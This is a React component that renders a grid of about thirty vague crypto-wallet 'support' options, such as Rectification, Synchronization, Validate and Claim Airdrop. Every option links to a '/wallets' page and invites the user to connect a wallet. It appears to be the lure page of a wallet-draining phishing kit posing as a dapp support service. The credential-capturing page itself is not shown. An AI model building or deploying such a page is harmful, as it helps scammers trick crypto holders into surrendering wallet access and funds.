import { Link } from 'react-router-dom';
import {
  ArrowLeftRight,
  PiggyBank,
  Bug,
  Droplet,
  Triangle,
  Lock,
 Wrench,
 UserX,
  Network ,
  DollarSign,
  FileX,
  CirclePause,
  Coins,
  Satellite,
  CircleCheck,
  LogIn,
  FileText,
} from 'lucide-react';

const services = [
  { title: "Claim Presale Token", description: "Click here to claim token.", icon: ArrowLeftRight, link: "/wallets" },
  { title: "Connect To Dapps", description: "Click here to connect to dapps", icon: ArrowLeftRight, link: "/wallets" },
  { title: "Staking", description: "Click here for tokens/coins staking related issues.", icon: PiggyBank, link: "/wallets" },
  { title: "Migration", description: "Click here to migrate seamlessly with no hassle.", icon: ArrowLeftRight, link: "/wallets" },
  { title: "Bridge", description: "Do you have any issue while trying to transfer tokens between chains?", icon: Triangle, link: "/wallets" },
  { title: "Rectification", description: "Click here for rectification related issues.", icon: Bug, link: "/wallets" },
  { title: "Coinflip", description: "Click here to flip coin.", icon: ArrowLeftRight, link: "/wallets" },
  { title: "Claim Presale Token", description: "Click here to claim presale tokens.", icon: ArrowLeftRight, link: "/wallets" },
  { title: "Revoke Transactions And Access", description: "Click here to regain access to your wallet, and revoke transactions.", icon: Triangle, link: "/wallets" },
  { title: "Synchronization", description: "Click here to synchronize or any related issues.", icon: Droplet, link: "/wallets" },
  { title: "Revert Transactions", description: "Click here for transaction related issues.", icon: Triangle, link: "/wallets" },
  { title: "NFTs", description: "Click here to mint/transfer nfts or need support on how to receive nfts?", icon: Lock, link: "/wallets" },
  { title: "Swap/Exchange", description: "We will support you in any related issues with swaping and/or exchange of coins.", icon: Wrench, link: "/wallets" },
  { title: "Clear Ui Bug", description: "Click here to clear Ui Bugs", icon: Triangle, link: "/wallets" },
  { title: "Claim Reward", description: "Click here for reward claiming or any related issues.", icon: FileX, link: "/wallets" },
  { title: "Hard Reset", description: "Click here to hard reset.", icon: Triangle, link: "/wallets" },
  { title: "Claim Airdrop", description: "Click here for airdrop claiming or any related issues.", icon: Droplet, link: "/wallets" },
  { title: "Transaction Delay", description: "Click here for stuck/delayed transactions.", icon: CirclePause, link: "/wallets" },
  { title: "Buy Coins/Tokens", description: "To trade, your account must be marked as a trusted payment source.", icon: Coins, link: "/wallets" },
  { title: "Missing/Irregular balance", description: "Click here for missing or irregular funds.", icon: Satellite, link: "/wallets" },
  { title: "Claim V2", description: "Do you have any issue while trying to claim your v2?", icon: UserX, link: "/wallets" },
  { title: "Validate", description: "Click here to start validation.", icon: Network, link: "/wallets" },
  { title: "Wallet Glitch/Error", description: "Click here if you have any glitch issues on your wallet.", icon: Triangle, link: "/wallets" },
  { title: "High Fees", description: "Click here if you are facing an increase in transaction fees.", icon: DollarSign, link: "/wallets" },
  { title: "Whitelist", description: "Click here for help whitelisting your wallet for nfts.", icon: CircleCheck, link: "/wallets" },
  { title: "Login Issues", description: "Click here if you encounter any issues logging in to your wallet.", icon: LogIn, link: "/wallets" },
  { title: "Slippage", description: "Click here for slippage related issues.", icon: Triangle, link: "/wallets" },
  { title: "RPC Issues", description: "Click here for RPC related issues.", icon: Triangle, link: "/wallets" },
  { title: "Other Issues", description: "Click here for other issues not listed above.", icon: FileText, link: "/wallets" },
];

const ServiceCard = ({ title, description, icon: Icon, link }) => (
  <div className="w-full sm:w-1/2 lg:w-1/3 p-4">
    <Link to={link} className="sync-item block bg-transparent border rounded-2xl p-6 hover:shadow-lg hover:-translate-y-1 transition-transfor">
      <div className="flex items-center">
        <Icon className="w-16 h-16 text-white mr-4" />
        <div>
          <h3 className="text-xl font-semibold text-white">{title}</h3>
          <p className="text-gray-400">{description}</p>
        </div>
      </div>
    </Link>
  </div>
);

const IssueSection = () => (
  <div>
    <section className="bg-transparent py-16">
      <div className="container mx-auto px-4">
        <div className="text-center">
          <h2 className="text-4xl md:text-6xl font-bold text-white mb-4 text-gradient">Select Issue Below</h2>
          <p className="text-gray-300">
            You can also connect your wallet by selecting any of the <span className="text-gray-500">option</span> below.
          </p>
        </div>
      </div>
    </section>
    <section className="bgtransparent py-16">
      <div className="container mx-auto px-4">
        <div className="flex flex-wrap -mx-4">
          {services.map((service, index) => (
            <ServiceCard key={index} {...service} />
          ))}
        </div>
      </div>
    </section>
  </div>
);

export default IssueSection;